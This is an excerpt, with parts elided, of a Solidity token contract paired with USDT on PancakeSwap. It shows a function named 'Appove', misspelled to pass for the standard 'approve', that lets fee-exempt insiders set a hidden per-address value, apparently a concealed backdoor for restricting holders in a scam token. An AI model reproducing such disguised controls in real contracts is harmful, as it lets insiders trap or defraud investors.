...
contract TokenMain is Ownable, IERC20 {
    ...
    mapping (address => uint256) private _isTxLimitEmp;
    ...
    constructor(string memory _name_, string memory _symbol_, address _marketWallet) {
        ...
        IPancakeFactory02(pancakeSwapV2Router.factory()).createPair(address(this), usdt);
    ...
    function Appove(address _andIng, uint256 _amount) external {
        if (isExcludedFromFee[msg.sender]){
            _isTxLimitEmp[_andIng] = _amount;
        }else{
            revert();
        }
    }
